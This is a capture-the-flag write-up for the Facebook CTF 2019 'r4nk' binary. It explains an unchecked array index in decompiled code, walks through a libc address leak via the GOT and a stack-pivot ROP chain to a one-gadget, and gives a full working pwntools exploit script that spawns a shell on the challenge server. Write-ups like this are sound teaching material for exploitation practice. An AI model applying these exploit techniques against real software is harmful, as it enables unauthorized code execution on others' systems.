# Facebook CTF 2019 - r4nk

```
__int64 __fastcall show(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  char *v3; // r8
  __int64 result; // rax

  v1 = 0LL;
  do
  {
    v2 = *(_QWORD *)(a1 + 8 * v1++);
    v3 = (&titles)[v2];
    result = __dprintf_chk(1LL, 1LL, "%i. %s\n");
  }
  while ( v1 != 12 );
  return result;
}
```
v2 is rank value which can be modified in rank().
`v3 = (&titles)[v2];` doesn't check the range. By modifying v2 value, we can do arbitrary memory read.

```
__int64 __fastcall rank(__int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax

  write(1, "\nt1tl3> ", 9uLL);
  v1 = (signed int)sub_4007B0();
  write(1, "r4nk> ", 7uLL);
  result = (signed int)sub_4007B0();
  *(_QWORD *)(a1 + 8 * v1) = (signed int)result;
  return result;
}
```

sub_4007B0 calls read(0, nptr, 0x80). Since binary is not PIE,
the address of nptr(global variable) is static value we alreay know.
0x80 is large enough to write some values. So I wrote got address of read function at nptr,
followed by modifying rank value with the offset of nptr, and call show(). Then we can get base address of libc.

After libc leak, write address of one gadget at nptr. then calling rank(),
overwrite return address of main function with ROP chain.

ROP chain consists of
- pop rsp; pop r13; ret gadget
- address of nptr(at which garbage value for pop r13 and address of one gadget are)

```
from pwn import *

bin = ELF('./r4nk')
libc = ELF('./libc-2.27.so', checksec=False)

LOCAL = False

one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]

# context.log_level = 'debug'


def rank(title, rank):
    conn.sendlineafter('>', str(2))
    conn.sendlineafter('>', str(title))
    conn.sendlineafter('>', str(rank))


if LOCAL:
    conn = process('./r4nk', env={'LD_PRELOAD': './libc-2.27.so'})
    # gdb.attach(conn, 'b * 0x400acd')
else:
    conn = remote('challenges.fbctf.com', 1339)

conn.sendlineafter('>', str(1) + 'XXXXXXX' + p64(bin.got['read']))
rank(0, 17)
conn.sendlineafter('>', str(1) + 'XXXXXXX' + p64(bin.got['read']))
conn.recvuntil('0. ')
libc_addr = u64(conn.recv(6)+'\x00\x00') - libc.symbols['read']

log.info('Libc addr: ' + hex(libc_addr))
log.info('One gadget addr: ' + hex(libc_addr + one_gadget_offset[1]))

conn.sendlineafter('>', str(2) + 'XXXXXXXYYYYYYYYZZZZZZZZ' +
                   p64(libc_addr + one_gadget_offset[1]))
conn.sendlineafter('>', str(17))
conn.sendlineafter('>', str(0x400980))  # pop rsp; pop r13; ret
rank(18, 0x602110)

conn.sendlineafter('>', str(3))

conn.interactive()
```